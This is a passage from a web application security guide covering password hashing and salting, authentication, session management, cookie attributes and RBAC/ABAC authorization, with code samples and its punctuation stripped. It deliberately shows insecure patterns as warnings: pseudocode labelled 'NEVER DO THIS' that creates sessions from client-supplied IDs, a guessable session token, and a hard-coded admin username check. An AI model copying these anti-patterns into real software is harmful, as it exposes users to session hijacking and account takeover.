like encryption or obfuscation  It can live alongside the hash  or even encoded with it  as is the case with bcrypt  If your password table or file falls into attacker hands access to the salt won t help them use a lookup table to mount an attack on the collection of hashes  A salt should be globally unique per user  OWASP recommends 32 or 64 bit salt if you can manage it  and NIST requires 128 bit at a minimum  A UUID will certainly work and although probably overkill  it s generally easy to generate  if costly to store  Hashing and salting is a good start  but as we will see below  even this might not be enough  Use A Hash That s Worth Its Salt Sadly  all hashing algorithms are not created equal  SHA 1 and MD5 had been common standards for a long time until the discovery of a low cost collision attack  Luckily there are plenty of alternatives that are low collision  and slow  Yes  slow  A slower algorithm means that a brute force attack is more time consuming and therefore costlier to run  The best widely available algorithms are now considered to be scrypt and bcrypt  Because contemporary SHA algorithms and PBKDF2 are less resistant to attacks where GPUs are used  they are probably not great long term strategies  A side note  technically Argon2  scrypt  bcrypt and PBKDF2 are key derivation functions that use key stretching techniques  but for our purposes  we can think of them as a mechanism for creating a hash  Hash Algorithm Use for passwords  scrypt Yes bcrypt Yes SHA 1 No SHA 2 No MD5 No PBKDF2 No Argon2 watch  see sidebar  About Argon2 In July of 2015  Argon2 was announced as the winner of the Password Hashing Competition  Bindings are available for several languages  Argon2 was designed specifically for the purpose of hashing passwords and is resistant to attacks using GPUs and other specialized hardware  However  it is very new and has not yet been broadly adopted  although signs are good that it will be soon  Pay attention to how this adoption occurs  and when implementations become more widely available  When we feel comfortable recommending adoption  we ll update this evolving publication  In addition to choosing an appropriate algorithm  you want to make sure you have it configured correctly  Key derivation functions have configurable iteration counts  also known as work factor  so that as hardware gets faster  you can increase the time it takes to brute force them  OWASP provides recommendations on functions and configuration in their Password Storage Cheat Sheet  If you want to make your application a bit more future proof  you can add the configuration parameters in the password storage  too  along with the hash and salt  That way  if you decide to increase the work factor  you can do so without breaking existing users or having to do a migration in one shot  By including the name of the algorithm in storage  too  you could even support more than one at the same time allowing you to evolve away from algorithms as they are deprecated in favor of stronger ones  Once More with Hashing Really the only change to the code above is that rather than storing the password in clear text  you are storing the salt  the hash  and the work factor  That means when a user first chooses a password  you will want to generate a salt and hash the password with it  Then  during a login attempt  you will use the salt again to generate a hash to compare with the stored hash  As in  CREATE TABLE application_user   email_address VARCHAR 100  NOT NULL PRIMARY KEY  hash_and_salt VARCHAR 60  NOT NULL   def login conn  email  password   result   conn cursor   execute   SELECT hash_and_salt FROM application_user WHERE email_address        email   user   result fetchone   if user is not None  hashed   user 0  encode  utf 8   return is_hash_match password  hashed  return False def is_hash_match password  hash_and_salt   salt   hash_and_salt 0 29  return hash_and_salt    bcrypt hashpw password  salt  The example above uses the python bcrypt library  which stores the salt and the work factor in the hash for you  If you print out the results of hashpw     you can see them embedded in the string  Not all libraries work this way  Some output a raw hash  without salt and work factor  requiring you to store them in addition to the hash  But the result is the same  you use the salt with a work factor  derive the hash  and make sure it matches the one that was originally generated when the password was first created  Final Tips This might be obvious  but all the advice above is only for situations where you are storing passwords for a service that you control  If you are storing passwords on behalf of the user to access another system  your job is considerably more difficult  Your best bet is to just not do it since you have no choice but to store the password itself  rather than a hash  Ideally the third party will be able to support a much more appropriate mechanism like SAML  OAuth or a similar mechanism for this situation  If not  you need to think through very carefully how you store it  where you store it and who has access to it  It s a very complicated threat model  and hard to get right  Many sites create unreasonable limits on how long your password can be  Even if you hash and salt correctly  if your password length limit is too small  or the allowed character set too narrow  you substantially reduce the number of possible passwords and increase the probability that the password can be brute forced  The goal  in the end  is not length  but entropy  but since you can t effectively enforce how your users generate their passwords  the following would leave in pretty good stead  Minimum 12 alpha numeric and symbolic  1   A long maximum like 100 characters  OWASP recommends capping it at most 160 to avoid susceptibility to denial of service attacks resulting from passing in extremely long passwords  You ll have to decide if that s really a concern for your application  Provide your users with some kind of text recommending that  if at all possible  they  use a password manager randomly generate a long password  and don t reuse the password for another site  Don t prevent the user from pasting passwords into the password field  It makes many password managers unusable If your security requirements are very stringent then you may want to think beyond password strategy and look to mechanisms like two factor authentication so you aren t over reliant on passwords for security  Both NIST and Wikipedia have very detailed explanations of the effects of character length and set limits on entropy  If you are resources constrained  you can get quite specific about the cost of breaking into your systems based on speed of GPU clusters and keyspace  but for most of situations  this level of specificity just isn t necessary to find an appropriate password strategy  In Summary Hash and salt all passwords  Use an algorithm that is recognized as secure and sufficiently slow  Ideally  make your password storage mechanism configurable so it can evolve  Avoid storing passwords for external systems and services  Be careful not to set password size limits that are too small  or character set limits that are too narrow  Authenticate Users Safely If we need to know the identity of our users  for example to control who receives specific content  we need to provide some form of authentication  If we want to retain information about a user between requests once they have authenticated  we will also need to support session management  Despite being well known and supported by many full featured frameworks  these two concerns are implemented incorrectly often enough that they have earned spot  2 in the OWASP Top 10  Authentication is sometimes confused with authorization  Authentication confirms that a user is who they claim to be  For example  when you log into your bank  your bank can verify it is in fact you and not an attacker trying to steal the fortune you amassed selling your captioned cat pictures site  Authorization defines whether a user is allowed to do something  Your bank may use authorization to allow you to see your overdraft limit  but not allow you to change it  Session management ties authentication and authorization together  Session management makes it possible to relate requests made by a particular user  Without session management  users would have to authenticate during each request they sent to a web application  All three elements   authentication  authorization  and session management   apply to both human users and to services  Keeping these three separate in our software reduces complexity and therefore risk  There are many methods of performing authentication  Regardless of which method you choose  it is always wise to try to find an existing  mature framework that provides the capabilities you need  Such frameworks have often been scrutinized over a long period of time and avoid many common mistakes  Helpfully  they often come with other useful features as well  An overarching concern to consider from the start is how to ensure credentials remain private when a client sends them across the network  The easiest  and arguably only  way to achieve this is to follow our earlier advice to use HTTPS for everything  One option is to use the simple challenge response mechanism specified in the HTTP protocol for a client to authenticate to a server  When your browser encounters a 401  Unauthorized  response that includes information about a challenge to access the resource  it will popup a window prompting you to enter your name and password  keeping them in memory for subsequent requests  This mechanism has some weaknesses  the most serious of which being that the only way for a user to logout is by closing their browser  A safer option that allows you to manage the lifecycle of a user s session after authenticating is by simply entering credentials through a web form  This can be as simple as looking up a username in a database table and comparing the hash of a password using an approach we outlined in our earlier section on hashing passwords  For example  using Devise  a popular framework for Ruby on Rails  this can be done by registering a module for password authentication in the model used to represent a User  and instructing the framework to authenticate users before requests are processed by controllers    Register Devise s database_authenticatable module in our User model to   handle password authentication using bcrypt  We can optionally tune the work   factor with the  stretches  option  class User   ActiveRecord  Base devise  database_authenticatable end   Superclass to inherit from in controllers that require authentication class AuthenticatedController   ApplicationController before_action  authenticate_user  end Understand Your Options Although authenticating using a username and a password works well for many systems  it isn t our only option  We can rely on external service providers where users may already have accounts to identify them  We can also authenticate users using a variety of different factors  something you know  such as a password or a PIN  something you have  such as your mobile phone or a key fob  and something you are  such as your fingerprints  Depending on your needs  some of these options may be worth considering  while others are helpful when we want to add an extra layer of protection  One option that offers a convenience for many users is to allow them to log in using their existing account on popular services such as Facebook  Google  and Twitter  using a service called Single Sign On  SSO   SSO allows users to log in to different systems using a single identity managed by an identity provider  For example  when visiting a website you may see a button that says  Sign in with Twitter  as an authentication option  To achieve this  SSO relies on the external service to manage logging the user in and to confirm their identity  The user never provides any credentials to our site  SSO can significantly reduce the amount of time it takes to sign up for a site and eliminates the need for users to remember yet another username and password  However  some users may prefer to keep their use of our site private and not connect it to their identity elsewhere  Others may not have an existing account with the external providers we support  It is always preferable to allow users to register by manually entering their information as well  A single factor of authentication such as a username and password is sometimes not enough to keep users safe  Using other factors of authentication can add an additional layer of security to protect users in the event a password is compromised  With Two Factor Authentication  2FA   a second  different factor of authentication is required to confirm the identity of a user  If something the user knows  such as a username and password  is used as the first factor of authentication  a second factor could be something the user has  such as a secret code generated using software on their mobile phone or by a hardware token  Verifying a secret code sent to a user via SMS text message was once a popular way of doing this  but it is now deprecated due to presenting various risks  Applications like Google Authenticator and a multitude of other products and services can be safer and are relatively easy to implement  although any option will increase complexity of an application and should be considered mainly when applications maintain sensitive data  Reauthenticate For Important Actions Authentication isn t only important when logging in  We can also use it to provide additional protection when users perform sensitive actions such as changing their password or transferring money  This can help limit the exposure in the event a user s account is compromised  For example  some online merchants require you to re enter details from your credit card when making a purchase to a newly added shipping address  It is also helpful to require users to re enter their passwords when updating their personal information  Conceal Whether Users Exist When a user makes a mistake entering their username or password  we might see a website respond with a message like this  The user ID is unknown  Revealing whether a user exists can help an attacker enumerate accounts on our system to mount further attacks against them or  depending on the nature of the site  revealing the user has an account may compromise their privacy  A better  more generic  response might be  Incorrect user ID or password  This advice doesn t just apply when logging in  Users can be enumerated through many other functions of a web application  for example when signing up for an account or resetting their password  It is good to be mindful of this risk and avoid disclosing unnecessary information  One alternative is to send an email with a link to continue their registration or a password reset link to a user after they enter their email address  instead of outputting a message indicating whether the account exists  Preventing Brute Force Attacks An attacker might try to conduct a brute force attack to guess account passwords until they find one that works  With attackers increasingly using large networks of compromised systems referred to as botnets to conduct attacks with  finding an effective solution to protect against this while not impacting service continuity is a challenging task  There are many options we can consider  some of which we ll discuss below  As with most security decisions  each provides benefits but also comes with tradeoffs  A good starting point that will slow an attacker down is to lock users out temporarily after a number of failed login attempts  This can help reduce the risk of an account being compromised  but it can also have the unintended effect of allowing an attacker to cause a denial of service condition by abusing it to lock users out  If the lockout requires an administrator to unlock accounts manually  it can cause a serious disruption to service  In addition  account lockout could be used by an attacker to determine whether accounts exist  Still  this will make things difficult for an attacker and will deter many  Using short lockouts of between 10 to 60 seconds can be an effective deterrent without imposing the same availability risks  Another popular option is to use CAPTCHAs  which attempt to deter automated attacks by presenting a challenge that a human can solve but a computer can not  Oftentimes it seems as though they present challenges that can be solved by neither  These can be part of an effective strategy  but they have become decreasingly effective and face criticisms  Advancements have made it possible for computers to solve challenges with greater accuracy  and it has become inexpensive to hire human labor to solve them  They can also present problems for people with vision and hearing impairments  which is an important consideration if we want our site to be accessible  Layering these options has been used as an effective strategy on sites that see frequent brute force attacks  After two login failures occur for an account  a CAPTCHA might be presented to the user  After several more failures  the account might be locked out temporarily  If that sequence of failures repeats again  it might make sense to lock the account once again  this time sending an email to the account owner requiring them to unlock the account using a secret link  Don t Use Default Or Hard Coded Credentials Shipping software with default credentials that are easy to guess presents a major risk for users and applications alike  It may seem like it is providing a convenience for users  but in reality this couldn t be further from the truth  It is common to see this in embedded systems such as routers and IoT devices  which can immediately become easy targets once connected to networks  Better options might be requiring users to enter unique one time passwords and then forcing the user to change it  or preventing the software from being accessed externally until a password is set  Sometimes hard coded credentials are added to applications for development and debugging purposes  This presents risks for the same reasons and might be forgotten about before the software ships  Worse  it may not be possible for the user to change or disable the credentials  We must never hard code credentials in our software  In Frameworks Most web application frameworks include authentication implementations that support a variety of authentication schemes  and there are many other third party frameworks to choose from as well  As we stated earlier  it is preferable to try to find an existing  mature framework that suits your needs  Below are some examples to get you started  Framework Approaches Java Apache Shiro OACC Spring Spring Security Ruby on Rails Devise ASP NET ASP NET Core authentication Built in Authentication Providers Play play silhouette Node js Passport framework In Summary Use existing authentication frameworks whenever possible instead of creating one yourself  Support authentication methods that make sense for your needs  Limit the ability of an attacker to take control of an account  You can take steps to prevent attacks to identify or compromise accounts  Never use default or hard coded credentials  Protect User Sessions As a stateless protocol HTTP offers no built in mechanism for relating user data across requests  Session management is commonly used for this purpose  both for anonymous users and for users who have authenticated  As we mentioned earlier  session management can apply both to human users and to services  Sessions are an attractive target for attackers  If an attacker can break session management to hijack authenticated sessions  they can effectively bypass authentication entirely  To make matters worse  it is fairly common to see session management implemented in a way that makes it easier for sessions to fall into the wrong hands  So what can we do to get it right  As with authentication  it is preferable to use an existing  mature framework to handle session management for you and tune it for your needs rather than trying to implement it yourself from scratch  To give you some idea of why it is important to use an existing framework so you can focus on using it for your needs  we ll discuss some common problems in session management  which fall into two categories  weaknesses in session identifier generation  and weaknesses in the session lifecycle  Generate Safe Session Identifiers Sessions are typically created by setting a session identifier inside a cookie that will be sent by a user s browser in subsequent requests  The security of these identifiers depend on them being unpredictable  unique  and confidential  If an attacker can obtain a session identifier by guessing it or observing it  they can use it to hijack a user s session  The security of identifiers can be easy to undermine by using predictable values  which is fairly common to see in custom implementations  For example  we might see a cookie of the form  Set Cookie  sessionId NzU4NjUtMTQ2Nzg3NTIyNzA1MjkxMg What happens if an attacker logs in several additional times and observes the following sequence for the sessionId cookie  NzU4ODQtMTQ2Nzg3NTIyOTg0NTE4Ng NzU4OTItMTQ2Nzg3NTIzNTQwODEzOQ An attacker might recognize that the sessionId is base64 encoded and decode it to observe its values  75865 1467875227052912 75884 1467875229845186 75892 1467875235408139 It doesn t take much guesswork to realize the token is comprised of two values  what is most likely a sequence number  and the current time in microseconds  An identifier of this type would take little effort for an attacker to guess and hijack sessions  Although this is a basic example  other generation schemes don t always offer much more in the way of protection  Attackers can make use of freely available statistical analysis tools to improve the chances of guessing more complex tokens  Using predictable inputs such as the current time or a user s IP address to derive a token are not enough for this purpose  So how can we generate a session identifier safely  To greatly reduce the chances of an attacker guessing a token  OWASP s Session Management Cheat Sheet recommends using a session identifier that is a minimum of 128 bits  16 bytes  in length generated using a secure pseudorandom number generator  For example  both Java and Ruby have classes named SecureRandom that obtain pseudorandom numbers from sources such as  dev urandom  Instead of using an identifier that will be used to look up information about a user  some session management implementations put information about the user inside of the cookie itself to eliminate the cost of performing a lookup in a data store  Unless done carefully using cryptographic algorithms to ensure the confidentiality  integrity  and authenticity of the data  this can lead to even more problems  The decision to store any information about a user inside of a cookie is a subject of controversy and should not be taken lightly  As a principle  limit the information sent inside the cookie to what is absolutely necessary  Never store personally identifiable information about the user or secret information  even when you re using encryption  If the information includes things like the user s username or their role and privilege levels  you must protect against the risk of an attacker tampering with the data to bypass authorization or hijack another user s account  If you choose to store this type of information inside of cookies  look for an existing framework that mitigates these risks and has withstood scrutiny by experts  Don t Expose Session Identifiers Using HTTPS will help prevent someone from eavesdropping on network traffic to steal session identifiers  but they are sometimes leaked unintentionally in other ways  In a classic example  an airline customer sends a link to search results on the airline s website to a friend  The link contains a parameter with the customer s session identifier  and the friend is suddenly able to book flights as the customer  Needless to say  exposing the session identifier in the URL is risky  It might get unwittingly sent to a third party like in the above example  exposed in the Referer header if the user clicks a link to an external website  or logged in the site s logs  Cookies are a better choice for this purpose since they don t risk exposure in this way  It is also common to see session identifiers sent in custom HTTP headers and even in body arguments of POST requests  No matter what you choose to do  make sure the session identifier should not be exposed in URLs  logs  referrer  or anywhere they could be accessed by an attacker  Protect Your Cookies When cookies are used for sessions  we should take some simple precautions to make sure they are not unintentionally exposed  There are four attributes that are important to understand for this purpose  Domain  Path  HttpOnly  and Secure  Domain restricts the scope of a cookie to a particular domain and its subdomains  and Path further restricts the scope to a path and its subpaths  Both attributes are set to fairly restrictive values by default when not explicitly set  The default for Domain will only permit a cookie to be sent to the originating domain and its subdomains  and the default for Path will restrict a cookie to the path of the resource where the cookie was set and its subpaths  Setting the Domain to a less restrictive value can be risky  Imagine if we were to set the Domain to martinfowler com when visiting payments martinfowler com to pay for a new book subscription service  This would result in the cookie being sent to martinfowler com and any of its subdomains on subsequent requests  Aside from it potentially being unnecessary to send the cookie to all subdomains  if we don t control every subdomain and their security  for example  are they using HTTPS    it might help an attacker to capture cookies  What would happen if our user visited evil martinfowler com  The Path attribute should also be set as restrictive as possible  If the session identifier is only needed when accessing the  secret  path and its subpaths after logging in at  login  it is a good idea to set it to  secret   The other two attributes  Secure and HttpOnly  control how the cookie is used  The Secure flag indicates that the browser should only send the cookie when using HTTPS  The HttpOnly flag instructs the browser that the cookie should not be accessible through JavaScript or other client side scripts  which helps prevent it being stolen by malicious code  Putting it together  our cookie might look like this  Set Cookie  sessionId  top secret value   path  secret   secure  HttpOnly  domain payments martinfowler com The net effect of the above statement would be a cookie with client script access disabled that is only available to requests to the paths below https   payments martinfowler com secret   By restricting the scope of the cookie  the attack surface becomes much smaller  Managing the Session Lifecycle Properly managing the lifecycle of a session will reduce the risk of it becoming compromised  How you manage sessions depends on your needs  As an example  a bank probably has a very different session lifecycle than our site for captioned cat pictures  We may choose to begin a session during the first request a user makes to our site  or we may decide to wait until the user authenticates  Whatever you choose to do  there is a risk when changing the privilege level of a session  What would happen if an attacker is able to set the session identifier for a user to a less privileged session known to the attacker  for example in a cookie or in a hidden form field  If the attacker is able to trick the user into logging in  they are suddenly in control of a more privileged session  This is an attack called session fixation  There are two things we can do to avoid having our users falling into this trap  First  we should always create a new session when a user authenticates or elevates their privilege level  Second  we should only create session identifiers ourselves and ignore identifiers that aren t valid  We would never want to do this     pseudocode  NEVER DO THIS if   isValid sessionId     session   createSession sessionId     The longer a session is active  the greater the chance an attacker might be able to get their hands on it  To reduce that risk and keep our session table clean  we can impose timeouts on sessions that are left inactive for some amount of time  The duration of time depends on your risk tolerance  On our captioned cat pictures site  it might only be necessary to do this after a month or even longer  A bank  on the other hand  might have a strict policy of timing out sessions after 10 minutes of inactivity as a security precaution  Our users might not be using a computer they exclusively have access to  or they might prefer to not leave their session logged in  Always make sure there is a visible and easy way to log out  When a user does log out  we must instruct the browser to destroy their session cookie by indicating that it expired at a date in the past  For example  based the cookie we set earlier  Set Cookie  sessionId  top secret value   path  secret   secure  HttpOnly  domain payments martinfowler com  expires Thu  01 Jan 1970 00 00 00 GMT One final consideration is providing some way for users to terminate their active sessions in the event they accidentally forgot to logout of a system they don t own or even suspect their account has been compromised  One easy way to deal with this is to terminate all sessions for a user when they change their password  It is also helpful to provide the ability for a user to view a list of their active sessions to help them identify when they are at risk  Verify It There are a lot of different considerations involved in authentication and session management  To make sure we haven t made any mistakes  it is helpful to look at OWASP s ASVS  Application Security Verification Standard   which is an invaluable resource when making sure there are no gaps in requirements or in our implementation  The standard has an entire section on authentication and another on session management  ASVS suggests security based on three levels of needs  1  which will help defend against some basic vulnerabilities  2  which is suitable for an ordinary site that maintains some sensitive data  and 3  which we might see in highly sensitive applications such as for health care or financial services  Most of the security precautions we describe will fit in with level 2  In Frameworks We have outlined only some of the risks that arise in session identifier generation and session lifecycle management  Fortunately  session management is built into most web application frameworks and even some server implementations  providing a number of mature options to use rather than risk implementing it yourself  Framework Approaches Java Tomcat Jetty Apache Shiro OACC Spring Spring Security Ruby on Rails Ruby on Rails Devise ASP NET ASP NET Core authentication Built in Authentication Providers Play play silhouette Node js Passport framework In Summary Use existing session management frameworks instead of creating your own  Keep session identifiers secret  do not use them in URLs or logs  Protect session cookies using attributes to restrict their scope  Create a new session when one doesn t exist or whenever a user changes their privilege level  Never create sessions with ids you haven t created yourself  Make sure users have a way to log out and to terminate their existing sessions  Authorize Actions We discussed how authentication establishes the identity of a user or system  sometimes referred to as a principal or actor   Until that identity is used to assess whether an operation should be permitted or denied  it doesn t provide much value  This process of enforcing what is and is not permitted is authorization  Authorization is generally expressed as permission to take a particular action against a particular resource  where a resource is a page  a file on the files system  a REST resource  or even the entire system  Authorize on the Server Among the most critical mistakes a programmer can make is hiding capabilities rather than explicitly enforcing authorization on the server  For example  it is not sufficient to simply hide the  delete user  button from users that are not administrators  The request coming from the user cannot be trusted  so the server code must perform the authorization of the delete  Further  the client should never pass authorization information to the server  Rather the client should only be allowed to pass temporary identity information  such as session ids  that have been previously generated on the server  and are unguessable  see above for session management practices   Again  the server should not trust anything from the client as far as identity  permissions  or roles  that it cannot explicitly validate  Deny by Default Earlier in this article we talked about the value of positive validation  or whitelisting   The same principle applies with authorization  Your authorization mechanism should always deny actions by default unless they are explicitly allowed  Similarly  if you have some actions that require authorization and others that do not  it is much safer to deny by default and override any actions that don t require a permission  In both cases  providing a safe default limits the damage that can occur if you neglect to specify the permissions for a particular action  Authorize Actions on Resources Generally speaking  you will encounter two different kinds of authorization requirements  global permissions and resource level permissions  You can think of global permission as having an implicit system resource  However  implementation details between a global and resource permissions tend to be different  as demonstrated in the following examples  Because the resource of global permission is implicit  or  if you prefer  non existent  the implementation tends to be straightforward  For example  if I wanted to add a permission check to shutdown my server  I could do the following  public OperationResult shutdown final User callingUser    if  callingUser    null    callingUser hasPermission Permission SHUTDOWN     doShutdown    return SUCCESS    else   return PERMISSION_DENIED      An alternative implementation using Spring Security s declarative capability might look like this   PreAuthorize  hasRole  ROLE_SHUTDOWN     public void shutdown   throws AccessDeniedException   doShutdown      Resource authorization is generally more complex because it validates whether an actor can take a particular action against a particular resource  For example a user should be able to modify their own profile and only their own profile  Again  our system MUST validate that the caller is entitled to take the action on the specific resource being affected  The rules that govern resource authorization are domain specific and can be fairly complicated both to implement and maintain  Existing frameworks may provide assistance  but you will need to make sure the one you use is sufficiently expressive to capture the complexity you require without being too complicated to maintain  An example might look like this  public OperationResult updateProfile final UserId profileToUpdateId  final ProfileData newProfileData  final User callingUser    if  isCallerProfileOwner profileToUpdateId  callingUser     doUpdateProfile profileToUpdateId  newProfileData   return SUCCESS    else   return PERMISSION_DENIED      private boolean isCallerProfileOwner final UserId profileToUpdateId  final User callingUser      Make sure the user is trying to update their own profile return profileToUpdateId equals callingUser getUserId       Or declaratively  using Spring Security again   PreAuthorize  hasPermission  updateUserId   owns     public void updateProfile final UserId updateUserId  final ProfileData profileData  final User callingUser  throws AccessDeniedException   doUpdateProfile updateUserId  profileData     Use Policy to Authorize Behavior Fundamentally  the entire process from identification through execution of an action could be summarized as follows  An anonymous actor becomes a known principal through authentication  Policy determines whether an action can be taken by that principal against a resource    determines whether an can be taken by that principal against a   Assuming the policy allows the action  the action is executed  A policy contains the logic that answers the question of whether an action is or is not allowed  but the way it makes that assessments varies broadly based on the needs of the application  Although we are unable to cover them all  the following section will summarize some of the more common approaches to authorization and provide some idea of when each is best applied  Implementing RBAC Probably the most common variant of authorization is role based access control  RBAC   As the name implies  users are assigned roles and roles are assigned permissions  Users inherit the permission for any roles they have been assigned  Actions are validated for permissions  Perhaps you re wondering about the value of all this indirection  all you care about is that Kristen  your administrator  is able to delete users  and other users cannot  Why not just check for Kristen s username  as in the following code  public OperationResult deleteUser final UserId userId  final User callingUser    if  callingUser    null    callingUser getUsername   equals  admin_kristen      doDelete userId   return SUCCESS    else   return PERMISSION_DENIED      What happens when user  admin_kristen  leaves your organization or changes to another role  You either have to share her credentials  which is  of course  a very bad idea  or go through the code changing all references to  admin_kristen  to the new user  A very common alternative to this is to check for the role  as in this case  public OperationResult deleteUser final UserId userId  final User callingUser    if  callingUser    null    callingUser hasRole Role ADMIN     doDelete userId   return SUCCESS    else   return PERMISSION_DENIED      Better  but not great  We haven t tied identity to the action  but we still have a problem if we find that there are admins with lesser privileges that are allowed to add users  but not delete users  Suddenly our  admin  role isn t granular enough and we re forced to find all the  admin  checks  and  if appropriate  put an OR operation for operations allowed by both admins and our new user_creator role  As the system evolves  you end up with more and more complicated statements and an explosion in the number of roles  Users and roles will change as our software evolves  and so our solution should reflect that  Instead of hard coding user names or even role names  we ll be best served in the long term if our code validates that a particular action is allowed  This code shouldn t be concerned with who the user is  or even what roles they may or may not have  but rather whether they have the permission to do something  The mapping of identity to permission can be done upstream  public OperationResult deleteUser final UserId userId  final User callingUser    if  callingUser    null    callingUser hasPermission Permission DELETE_USER     doDelete userId   return SUCCESS    else   return PERMISSION_DENIED      Our structure is much better now because we ve made the choice to explicitly decouple permissions from roles  Yes  there is some complexity that comes with the extra step needed to map users to permissions  but generally speaking you can take advantage of frameworks like Spring Security or CanCanCan to do the heavy lifting  Consider RBAC when  Permissions are relatively static  Roles in your policies actually map reasonably to roles within your domain  rather than feeling like contrived aggregations of permissions  There isn t a terribly large number of permutations of permission  and therefore roles that will have to be maintained  You have no compelling reason to use one of the other options  Implementing ABAC If your application has more advanced needs than you can reasonably implement with RBAC  you may want to look at attribute based access control  ABAC   Attribute based access control can be thought of as a generalization of RBAC that extends to any attribute of the user  the environment in which the user exists  or the resource being accessed  With ABAC  instead of making access control decisions based on just whether the user has a role assigned  the logic can come from any property of the user s profile such as their position as defined by HR  the amount of time they have worked at the company  or the the country of their IP address  In addition  ABAC can draw on global attributes like the time of day or whether it s a national holiday in the user s locale  The most common standarized means of expressing ABAC policy is XACML  an XML based format from Oasis  This example demonstrates how one might write a rule that allows users to read if they are in a particular department at a particular time of day   Policy PolicyId  ExamplePolicy  RuleCombiningAlgId  urn oasis names tc xacml 1 0 rule combining algorithm permit overrides    Target   Subjects   AnySubject     Subjects   Resources   Resource   ResourceMatch MatchId  urn oasis names tc xacml 1 0 function anyURI equal    AttributeValue DataType  http   www w3 org 2001 XMLSchema anyURI  http   example com resources 1  AttributeValue   ResourceAttributeDesignator DataType  http   www w3 org 2001 XMLSchema anyURI  AttributeId  urn oasis names tc xacml 1 0 resource resource id       ResourceMatch    Resource    Resources   Actions   AnyAction      Actions    Target   Rule RuleId  ReadRule  Effect  Permit    Target   Subjects   AnySubject     Subjects   Resources   AnyResource     Resources   Actions   Action   ActionMatch MatchId  urn oasis names tc xacml 1 0 function string equal    AttributeValue DataType  http   www w3 org 2001 XMLSchema string  read  AttributeValue   ActionAttributeDesignator DataType  http   www w3 org 2001 XMLSchema string  AttributeId  urn oasis names tc xacml 1 0 action action id      ActionMatch    Action    Actions    Target   Condition FunctionId  urn oasis names tc xacml 1 0 function and    Apply FunctionId  urn oasis names tc xacml 1 0 function string equal    Apply FunctionId  urn oasis names tc xacml 1 0 function string one and only    SubjectAttributeDesignator DataType  http   www w3 org 2001 XMLSchema string  AttributeId  department      Apply   AttributeValue DataType  http   www w3 org 2001 XMLSchema string  development  AttributeValue    Apply   Apply FunctionId  urn oasis names tc xacml 1 0 function and    Apply FunctionId  urn oasis names tc xacml 1 0 function time greater than or equal    Apply FunctionId  urn oasis names tc xacml 1 0 function time one and only    EnvironmentAttributeSelector DataType  http   www w3 org 2001 XMLSchema time  AttributeId  urn oasis names tc xacml 1 0 environment current time      Apply   AttributeValue DataType  http   www w3 org 2001 XMLSchema time  09 00 00  AttributeValue    Apply   Apply FunctionId  urn oasis names tc xacml 1 0 function time less than or equal    Apply FunctionId  urn oasis names tc xacml 1 0 function time one and only    EnvironmentAttributeSelector DataType  http   www w3 org 2001 XMLSchema time  AttributeId  urn oasis names tc xacml 1 0 environment current time       Apply   AttributeValue DataType  http   www w3 org 2001 XMLSchema time  17 00 00  AttributeValue    Apply    Apply    Condition    Rule   Rule RuleId  Deny  Effect  Deny      Policy  It s worth mentioning that XACML has its challenges  It is certainly verbose and arguably cryptic  It s also one of the few options you have if you want to use a standardized model for defining ABAC policies  Another option is to build policies in the language of your application  bound to its domain  Below is an example of the same policy written in JavaScript declarative style supported by a small DSL  allow  read    of anyResource     if and  User department   is equalTo  development     timeOfDay   isDuring  9 00 PST    17 00 PST       There s considerable work to do here in addition to the defining of the policy itself that is beyond the scope of this article  To get a flavor for how something like this might be implemented  you can take a look at the repository for the DSL implementation that supports the example policy  Should you choose the path of using custom code  you will need to think about how much investment you are willing to make in the DSL itself and who owns the implementation  If you expect to have a large number of highly dynamic policies  a more sophisticated DSL might be worthwhile  An external DSL might be justified for cases in which non programmers need to understand the policies  Otherwise  for cases of more limited scope and static policies  it s best to start simple with the goal of making the policies clear to their primary maintainers  the programmers  and letting the DSL evolve over the lifecycle of the project  always taking care that changes to the DSL do not break existing policy implementations  Creating in a DSL is not a must  You can use the same object oriented  functional  or procedural coding style the rest of your application uses  and rely on strong design and refactoring practices to create clean code  The repo also includes an example with the same rules using a imperative  rather than declarative  approach  Consider ABAC when  Permissions are highly dynamic and simply changing user roles is going to be a significant maintenance headache  The profile attributes on which permissions depend are already maintained for other purposes  such as managing an employee s HR profile  Access control is sufficiently sensitive that control flows need to vary based on temporal attributes such as whether it s during the normal working hours of your employees  You wish to have centralized policy with very fine grained permissions  managed independently of your application code  Other Ways to Model Policy The above are just two possible ways of modeling policy and will probably accommodate most situations  Although they are probably rare  situations do arise that don t fit well into RBAC or ABAC  Other approaches include  Mandatory access control  MAC   centrally managed non overridable policy based on subject and resource security attributes  such as Linux  LSM  Relationship based Access Control  ReBAC   policy that is largely determined by relationship between principals and resources  Discretionary Access Control  DAC   policy approach that includes owner managed permission control  as well as systems with transferable tokens of authority  Rule based Access Control  dynamic role or permission assignment based on a set of operator programmed rules There is not universal agreement on when these approaches apply or even exactly how to define them  There is substantial overlap in the types of policies they allow operators to define  Before going down the path of choose a more esoteric approach  or inventing your own  be sure that RBAC or ABAC aren t reasonable approaches to modeling your policies  Implementation Considerations Finally  here are a few words of advice to consider when implementing authorization in your application  Browser caches can really mess with your authorization model when users share browsers  Make sure that you set the Cache Control header to  private  no cache  no store  for resources so that your server side authorization code is called every time   You will inevitably have to make a decision whether to use a declarative or imperative approach to validation logic  There is no right or wrong here  but you will want to consider what provides the most clarity  Declarative mechanisms like the annotations that Spring Security provides can be concise and elegant  but if the authorization flow is complicated  the built in expression language becomes convoluted and  arguably  you re better off writing well factored code   Try to find a solution  whether custom or framework based  that consolidates and reduces duplication of authorization logic  If you find your authorization code is scattered arbitrarily throughout your codebase  you are going to have a very hard time maintaining it  and that leads to security bugs  In Summary Authorization must always be checked on the server  Hiding user interface components is fine for user experience  but not an adequate security measure  Deny by default  Positive validation is safer and less error prone than negative validation  Code should authorize against specific resources such as files  profiles  or REST endpoints  Authorization is domain specific  but there are some common patterns to consider when designing your permission model  Stick to common patterns and frameworks unless you have a very compelling reason not to  Use RBAC for basic cases and keep permissions and roles decoupled to allow your policies to evolve  For more complicated scenarios  consider ABAC  and use XACML or policies coded in the application s language  This article is an Evolving Publication  Our intention is to continue to describe basic techniques that developers could  and should  use to reduce the chances of a security breach  To find out when we expand the article  follow the site s RSS feed or Martin s twitter feed  We ll also announce updates on our twitter feeds  Cade Cairns and Daniel Somerfield
